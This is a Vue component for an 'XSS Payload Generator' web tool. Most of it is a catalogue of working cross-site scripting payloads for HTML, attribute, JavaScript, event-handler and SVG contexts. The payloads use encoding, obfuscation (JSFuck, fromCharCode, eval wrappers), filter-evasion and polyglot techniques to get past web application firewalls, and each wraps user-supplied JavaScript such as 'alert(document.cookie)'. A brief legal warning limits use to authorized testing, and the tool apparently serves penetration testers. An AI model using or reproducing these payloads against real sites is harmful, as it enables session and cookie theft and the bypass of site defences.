<template>
  <div class="flex w-full flex-col items-center gap-4 p-4 sm:gap-0">
    <p class="text-muted-foreground mb-2 w-full max-w-6xl text-center text-sm">
      Generate XSS payloads with WAF bypass techniques
    </p>
    <Card class="route-transition-animation mb-4 w-full max-w-4xl rounded-2xl shadow-lg sm:mb-8">
      <CardHeader class="pb-2 sm:pb-3">
        <CardTitle
          class="flex items-center gap-1.5 text-base font-semibold sm:gap-2 sm:text-lg lg:text-xl"
        >
          <Icon icon="mdi:code-tags" class="text-primary h-4 w-4 sm:h-5 sm:w-5 lg:h-6 lg:w-6" />
          XSS Payload Generator
        </CardTitle>
      </CardHeader>
      <CardContent class="space-y-2.5 sm:space-y-3">
        <!-- Configuration -->
        <div class="grid grid-cols-1 gap-2 sm:grid-cols-2 sm:gap-3">
          <!-- Context -->
          <div class="space-y-1.5">
            <Label class="text-[10px] sm:text-xs">Injection Context</Label>
            <Select v-model="context" @update:modelValue="generatePayloads">
              <SelectTrigger class="h-8 text-[10px] sm:h-9 sm:text-xs">
                <SelectValue placeholder="Select context" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="html">HTML Context</SelectItem>
                <SelectItem value="attribute">HTML Attribute</SelectItem>
                <SelectItem value="script">JavaScript Context</SelectItem>
                <SelectItem value="event">Event Handler</SelectItem>
                <SelectItem value="svg">SVG Context</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <!-- Bypass Type -->
          <div class="space-y-1.5">
            <Label class="text-[10px] sm:text-xs">Bypass Technique</Label>
            <Select v-model="bypassType" @update:modelValue="generatePayloads">
              <SelectTrigger class="h-8 text-[10px] sm:h-9 sm:text-xs">
                <SelectValue placeholder="Select bypass" />
              </SelectTrigger>
              <SelectContent>
                <SelectItem value="basic">Basic</SelectItem>
                <SelectItem value="encoding">Encoding</SelectItem>
                <SelectItem value="obfuscation">Obfuscation</SelectItem>
                <SelectItem value="filter">Filter Evasion</SelectItem>
                <SelectItem value="polyglot">Polyglot</SelectItem>
              </SelectContent>
            </Select>
          </div>
        </div>

        <!-- Custom Payload Input -->
        <div class="space-y-1.5">
          <Label class="text-[10px] sm:text-xs">Custom JavaScript Code (Optional)</Label>
          <Input
            v-model="customCode"
            placeholder="alert(document.cookie)"
            class="h-8 font-mono text-[10px] sm:h-9 sm:text-xs"
            @input="generatePayloads"
          />
        </div>

        <!-- Payloads -->
        <div class="space-y-1.5">
          <div class="flex items-center justify-between">
            <Label class="text-[10px] sm:text-xs">Generated Payloads</Label>
            <Button
              @click="copyAllPayloads"
              variant="outline"
              size="sm"
              class="h-6 text-[10px] sm:h-7"
            >
              <Icon icon="mdi:content-copy" class="mr-1 h-3 w-3" />
              {{ copiedAll ? 'Copied!' : 'Copy All' }}
            </Button>
          </div>
          <div class="space-y-2">
            <div
              v-for="(payload, index) in payloads"
              :key="index"
              class="bg-muted/30 group border-muted-foreground/20 relative rounded-lg border p-2.5 sm:p-3"
            >
              <div class="mb-1 flex items-center justify-between">
                <span class="text-primary text-[9px] font-semibold sm:text-[10px]">{{
                  payload.name
                }}</span>
                <Button
                  @click="copyPayload(payload.code, index)"
                  variant="ghost"
                  size="sm"
                  class="h-5 px-2 text-[9px]"
                >
                  <Icon
                    :icon="copiedIndices.includes(index) ? 'mdi:check' : 'mdi:content-copy'"
                    class="h-3 w-3"
                  />
                </Button>
              </div>
              <pre
                class="overflow-x-auto text-[9px] leading-relaxed sm:text-[10px]"
              ><code>{{ payload.code }}</code></pre>
              <p
                v-if="payload.description"
                class="text-muted-foreground mt-1 text-[8px] sm:text-[9px]"
              >
                {{ payload.description }}
              </p>
            </div>
          </div>
        </div>

        <!-- Warning -->
        <div class="rounded-lg bg-orange-50 p-2.5 dark:bg-orange-950/20">
          <div
            class="mb-0.5 flex items-center gap-1.5 text-[10px] font-medium text-orange-700 dark:text-orange-300"
          >
            <Icon icon="mdi:alert" class="h-3.5 w-3.5" />
            Legal Warning
          </div>
          <p class="text-[9px] leading-tight text-orange-600 sm:text-[10px] dark:text-orange-400">
            XSS attacks without authorization are illegal. Only test on systems you own or have
            explicit permission to test.
          </p>
        </div>
      </CardContent>
    </Card>
  </div>
</template>

<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { Card, CardHeader, CardTitle, CardContent } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select'
import { Icon } from '@iconify/vue'

const context = ref('html')
const bypassType = ref('basic')
const customCode = ref('alert(1)')
const copiedIndices = ref<number[]>([])
const copiedAll = ref(false)

interface Payload {
  name: string
  code: string
  description?: string
}

const payloads = ref<Payload[]>([])

const xssPayloads: Record<string, Record<string, () => Payload[]>> = {
  html: {
    basic: () => [
      {
        name: 'Script Tag',
        code: '<' + 'script>' + customCode.value + '<' + '/script>',
        description: 'Basic script injection',
      },
      {
        name: 'IMG onerror',
        code: '<img src=x onerror="' + customCode.value + '">',
        description: 'Image error handler',
      },
      {
        name: 'Body onload',
        code: '<body onload="' + customCode.value + '">',
        description: 'Body load event',
      },
      {
        name: 'SVG onload',
        code: '<svg onload="' + customCode.value + '">',
        description: 'SVG load event',
      },
    ],
    encoding: () => [
      {
        name: 'HTML Entities',
        code: '<' + 'script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;<' + '/script>',
        description: 'Decimal HTML entities',
      },
      {
        name: 'Hex Entities',
        code: '<' + 'script>&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;<' + '/script>',
        description: 'Hex HTML entities',
      },
      {
        name: 'Unicode',
        code: '<' + 'script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)<' + '/script>',
        description: 'Unicode escape',
      },
      {
        name: 'Base64',
        code: '<img src=x onerror="eval(atob(\'' + btoa(customCode.value) + '\'))">',
        description: 'Base64 encoded',
      },
    ],
    obfuscation: () => [
      {
        name: 'String.fromCharCode',
        code: '<' + 'script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))<' + '/script>',
        description: 'Character code obfuscation',
      },
      {
        name: 'JSFuck',
        code:
          '<' +
          'script>(+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]]<' +
          '/script>',
        description: 'JSFuck style obfuscation',
      },
      {
        name: 'Comment Breaking',
        code: ('<' + 'script>/*-/*`/*\\`/*\'/*"/**/(PAYLOAD)//<' + '/script>').replace(
          'PAYLOAD',
          customCode.value,
        ),
        description: 'Comment evasion',
      },
    ],
    filter: () => [
      {
        name: 'Case Variation',
        code: '<' + 'ScRiPt>' + customCode.value + '<' + '/sCrIpT>',
        description: 'Mixed case bypass',
      },
      {
        name: 'Null Byte',
        code: '<' + 'script\\x00>' + customCode.value + '<' + '/script>',
        description: 'Null byte injection',
      },
      {
        name: 'Newline Breaking',
        code: '<' + 'script\n>' + customCode.value + '<' + '/script>',
        description: 'Newline bypass',
      },
      {
        name: 'Tab Breaking',
        code: '<' + 'script\t>' + customCode.value + '<' + '/script>',
        description: 'Tab character bypass',
      },
    ],
    polyglot: () => [
      {
        name: 'Universal Polyglot',
        code:
          'jaVasCript:' +
          '/*-/*' +
          '`' +
          '/*' +
          String.fromCharCode(92) +
          '`' +
          "/*'" +
          '/*"' +
          '/**/' +
          '(/* */oNcliCk=' +
          customCode.value +
          ' )' +
          '//%0D%0A%0d%0a//<' +
          '/stYle/<' +
          '/titLe/<' +
          '/teXtarEa/<' +
          '/scRipt/--!' +
          '>' +
          String.fromCharCode(92) +
          'x3csVg/<sVg/oNloAd=' +
          customCode.value +
          '//>' +
          String.fromCharCode(92) +
          'x3e',
        description: 'Works in multiple contexts',
      },
      {
        name: 'HTML/JS Polyglot',
        code: '\\\\"">><marquee><img src=x onerror=' + customCode.value + '></marquee>',
        description: 'Breaks out of multiple contexts',
      },
    ],
  },
  attribute: {
    basic: () => [
      {
        name: 'Quote Breaking',
        code: '" onerror="' + customCode.value,
        description: 'Break out with double quote',
      },
      {
        name: 'Single Quote',
        code: "' onerror='" + customCode.value,
        description: 'Break out with single quote',
      },
      {
        name: 'Space Breaking',
        code: 'x onerror=' + customCode.value,
        description: 'No quotes needed',
      },
      {
        name: 'Event Handler',
        code: '" autofocus onfocus="' + customCode.value,
        description: 'Autofocus event',
      },
    ],
    encoding: () => [
      {
        name: 'HTML Entities in Attr',
        code: `" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;`,
        description: 'Entity encoding in attribute',
      },
      {
        name: 'URL Encoding',
        code: `" onerror="%61%6c%65%72%74%28%31%29`,
        description: 'URL encoded',
      },
    ],
    obfuscation: () => [
      {
        name: 'Data URI',
        code: '" src="data:text/html,<' + 'script>' + customCode.value + '<' + '/script>',
        description: 'Data URI bypass',
      },
      {
        name: 'JavaScript Protocol',
        code: '" href="javascript:' + customCode.value,
        description: 'JavaScript protocol',
      },
    ],
    filter: () => [
      {
        name: 'Tab in Attribute',
        code: '"\tonerror="' + customCode.value,
        description: 'Tab character',
      },
      {
        name: 'Newline in Attribute',
        code: '"\nonerror="' + customCode.value,
        description: 'Newline character',
      },
    ],
    polyglot: () => [
      {
        name: 'Attribute Polyglot',
        code: '\'">' + '<' + 'script>' + customCode.value + '<' + '/script>',
        description: 'Break to script context',
      },
    ],
  },
  script: {
    basic: () => [
      {
        name: 'String Breaking',
        code: "';" + customCode.value + '//',
        description: 'Break out of string',
      },
      {
        name: 'Comment Breaking',
        code: '*/;' + customCode.value + ';//',
        description: 'Break multiline comment',
      },
      {
        name: 'Variable Injection',
        code: '-' + customCode.value + '-',
        description: 'Arithmetic context',
      },
    ],
    encoding: () => [
      { name: 'Hex Escape', code: "'\\x3b" + customCode.value, description: 'Hex escape sequence' },
      {
        name: 'Unicode Escape',
        code: "'\\u003b" + customCode.value,
        description: 'Unicode escape',
      },
    ],
    obfuscation: () => [
      {
        name: 'Template Literal',
        code: '`${' + customCode.value + '}`',
        description: 'Template string injection',
      },
      {
        name: 'Regex Breaking',
        code: '/./;' + customCode.value + '//',
        description: 'Regex context break',
      },
    ],
    filter: () => [
      {
        name: 'Whitespace Evasion',
        code: "'  " + customCode.value + '  //',
        description: 'Extra whitespace',
      },
      {
        name: 'Semicolon Bypass',
        code: "'" + customCode.value + '\n//',
        description: 'Newline as separator',
      },
    ],
    polyglot: () => [
      {
        name: 'Script Polyglot',
        code: "';" + customCode.value + '<' + '/script><' + 'script>' + customCode.value + '//',
        description: 'Multiple context break',
      },
    ],
  },
  event: {
    basic: () => [
      {
        name: 'Direct Execution',
        code: customCode.value,
        description: 'Direct code in event handler',
      },
      {
        name: 'Function Call',
        code: "eval('" + customCode.value + "')",
        description: 'Eval wrapper',
      },
      {
        name: 'Parentheses',
        code: '(' + customCode.value + ')',
        description: 'Expression grouping',
      },
    ],
    encoding: () => [
      {
        name: 'String.fromCharCode',
        code: `eval(String.fromCharCode(97,108,101,114,116,40,49,41))`,
        description: 'Character code array',
      },
      {
        name: 'Hex String',
        code: `eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')`,
        description: 'Hex escapes',
      },
    ],
    obfuscation: () => [
      {
        name: 'Window Reference',
        code: "window['ev'+'al'](PAYLOAD)".replace('PAYLOAD', "'" + customCode.value + "'"),
        description: 'Property access obfuscation',
      },
      {
        name: 'Constructor',
        code: "[]['constructor']['constructor'](PAYLOAD)()".replace(
          'PAYLOAD',
          "'" + customCode.value + "'",
        ),
        description: 'Function constructor',
      },
    ],
    filter: () => [
      {
        name: 'Whitespace',
        code: '   ' + customCode.value + '   ',
        description: 'Padded with spaces',
      },
      {
        name: 'Comments Inside',
        code: '/**/PAYLOAD/**/'.replace('PAYLOAD', customCode.value),
        description: 'Comment injection',
      },
    ],
    polyglot: () => [
      {
        name: 'Event Polyglot',
        code: "';" + customCode.value + ';//',
        description: 'Multiple syntax compatibility',
      },
    ],
  },
  svg: {
    basic: () => [
      {
        name: 'SVG Script',
        code: '<svg><' + 'script>' + customCode.value + '<' + '/script></svg>',
        description: 'SVG script tag',
      },
      {
        name: 'SVG Animate',
        code: '<svg><animate onbegin="' + customCode.value + '" attributeName=x dur=1s>',
        description: 'Animate event',
      },
      {
        name: 'SVG Set',
        code: '<svg><set onbegin="' + customCode.value + '" attributeName=x to=0>',
        description: 'Set element event',
      },
    ],
    encoding: () => [
      {
        name: 'SVG with Entities',
        code: '<svg><' + 'script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;<' + '/script></svg>',
        description: 'HTML entities in SVG',
      },
      {
        name: 'SVG CDATA',
        code: '<svg><' + 'script><![CDATA[' + customCode.value + ']]><' + '/script></svg>',
        description: 'CDATA section',
      },
    ],
    obfuscation: () => [
      {
        name: 'SVG Foreignobject',
        code: '<svg><foreignobject><body onload="' + customCode.value + '"></foreignobject></svg>',
        description: 'Foreign object injection',
      },
      {
        name: 'SVG Use',
        code:
          "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><" +
          'script>' +
          customCode.value +
          '<' +
          '/script></svg>#x">',
        description: 'Use with data URI',
      },
    ],
    filter: () => [
      {
        name: 'Namespace Bypass',
        code:
          '<svg xmlns="http://www.w3.org/2000/svg"><' +
          'script>' +
          customCode.value +
          '<' +
          '/script></svg>',
        description: 'Explicit namespace',
      },
      {
        name: 'SVG Tag Variation',
        code: '<svg><' + 'ScRiPt>' + customCode.value + '<' + '/sCrIpT></svg>',
        description: 'Case variation',
      },
    ],
    polyglot: () => [
      {
        name: 'SVG Polyglot',
        code: '<svg/onload="' + customCode.value + '">',
        description: 'Minimal SVG polyglot',
      },
    ],
  },
}

function generatePayloads() {
  const generator = xssPayloads[context.value]?.[bypassType.value]
  payloads.value = generator ? generator() : []
}

function copyPayload(code: string, index: number) {
  navigator.clipboard.writeText(code)
  copiedIndices.value.push(index)
  setTimeout(() => {
    copiedIndices.value = copiedIndices.value.filter((i) => i !== index)
  }, 1500)
}

function copyAllPayloads() {
  const allPayloads = payloads.value.map((p) => p.code).join('\n')
  navigator.clipboard.writeText(allPayloads)
  copiedAll.value = true
  setTimeout(() => {
    copiedAll.value = false
  }, 1500)
}

onMounted(() => {
  generatePayloads()
})
</script>
